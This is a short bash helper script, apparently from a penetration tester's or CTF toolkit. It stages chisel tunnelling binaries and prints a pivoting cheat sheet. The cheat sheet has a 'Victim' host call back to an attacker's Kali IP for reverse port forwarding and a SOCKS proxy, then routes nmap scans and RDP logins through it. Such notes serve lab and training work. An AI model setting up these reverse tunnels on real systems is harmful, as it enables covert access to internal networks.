#!/usr/bin/bash

# This script prepares tools and links for LFI exploitation

dir="net/chisel"

if [ "$1" = "-r" ]; then

    if [[ -d $PWD/$dir ]]
    then
		rm -rf $PWD/$dir/*
    fi
    exit

else

	if [[ ! -d $PWD/$dir ]]
	then
		mkdir -p $dir
	fi

	if [[ -d $PWD/$dir ]]
	then
	    # chisel_lin64  chisel_lin86  chisel_win64.exe  chisel_win86.exe
		cp /opt/$dir/chisel_lin64 -r $dir/cl64
		cp /opt/$dir/chisel_lin86 -r $dir/cl86
		cp /opt/$dir/chisel_win64.exe -r $dir/cl64.exe
		cp /opt/$dir/chisel_win86.exe -r $dir/cl86.exe

		echo "Copying all tools...done"

		echo ""
		echo "  Port Forwarding" 
		echo "  (Kali) chisel server -p 54321 --reverse"
		echo "  (Victim) cl64.exe client 10.10.14.4:54321 R:8001:localhost:8001" 
		echo ""
		echo "  Dynamic Port Forwarding"
		echo "	(Kali) net/chisel/cl64 server -p 9000 --reverse --socks5"
		echo "	(Victim) ./cl64(or .\cl64.exe) client <Kali IP>:9000 R:1080:socks"
		echo "	(Kali) sudo vi /etc/proxychains.conf" 
		echo "	(Kali) add "socks5 127.0.0.1 1080" # you set 1080 port for socks proxy in client"
		echo "	(Kali) sudo proxychains4 nmap -Pn --top-ports=20 -sT 172.16.128.5" 
		echo "	(Kali) proxychains xfreerdp /d:<domain name> /u:<user name> /v:<Victim IP> +clipboard" 
		echo ""

		pwd & ls $dir
		chmod 755 $dir/*
	
    else
		echo "No $dir directory exists"
    fi
  
    
fi


